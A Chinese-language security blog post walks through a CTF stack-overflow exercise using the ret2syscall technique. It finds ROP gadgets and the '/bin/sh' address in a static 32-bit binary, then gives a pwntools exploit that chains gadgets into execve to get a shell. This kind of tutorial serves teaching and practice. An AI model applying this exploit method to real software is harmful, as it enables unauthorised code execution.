<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 栈溢出之ret2syscall · Mi1k7ea</title><meta name="description" content="栈溢出之ret2syscall - Mi1k7ea"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/1.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.mi1k7ea.com/atom.xml" title="Mi1k7ea"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/1.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">MI1K7EA</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="/tags/" target="_self" class="nav-list-link">分类</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">关于</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">栈溢出之ret2syscall</h1><div class="post-info">2019年3月3日</div><div class="post-content"><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p>
<p>关键在于——程序中存在int 0x80中断，通过该指令可以进行系统调用，其中可通过不同的系统调用号调用不同的系统调用。</p>
<p>一般地，我们利用如下系统调用来获取shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
<p>当遇到32位程序时，需要使得：</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb（0xb 为 execve 对应的系统调用号）</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>先运行程序查看基本功能，并file看到是静态链接文件，和libc无关：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/1.png" alt=""></p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/2.png" alt=""></p>
<p>checksec发现只开启了NX：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/3.png" alt=""></p>
<p>打开IDA看到存在gets()即存在栈溢出风险，且IDA中给出变量v4相对于ESP和EBP的偏移分别为ESP+1Ch和EBP-64h：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/4.png" alt=""></p>
<p>查看String窗口，发现存在“/bin/sh”字符串：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/5.png" alt=""></p>
<p>当然还可以使用ROPgadget工具搜索，直接找到“/bin/sh”字符串的存储地址，记下该字符串地址为0x080be408：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/6.png" alt=""></p>
<p>因为是静态链接，不用看libc相关函数，而且函数太多了，直接搜索系统调用吧，记下系统调用的地址为0x08049421：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/7.png" alt=""></p>
<p>接着寻找pop eax~edx+ret寄存器的指令，记下符合条件的地址分别为0x080bb196和0x0806eb90：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/8.png" alt=""></p>
<p>至于v4变量到函数返回地址处的偏移量和前面几个题目的计算方法即结果都是一样的，这里不再多说。</p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">int_80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, pop_edx_ecx_ebx_addr, <span class="number">0</span>, <span class="number">0</span>, binsh, pop_eax_addr, <span class="number">0xb</span>, int_80_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>运行后getshell：</p>
<p><img src="/2019/03/03/栈溢出之ret2syscall/9.png" alt=""></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2syscall" target="_blank" rel="noopener">ret2syscall</a></p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/03/05/栈溢出之ret2libc/" class="prev">PREV</a><a href="/2019/03/03/栈溢出之ret2shellcode/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2020 <a href="https://www.mi1k7ea.com">Mi1k7ea</a>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>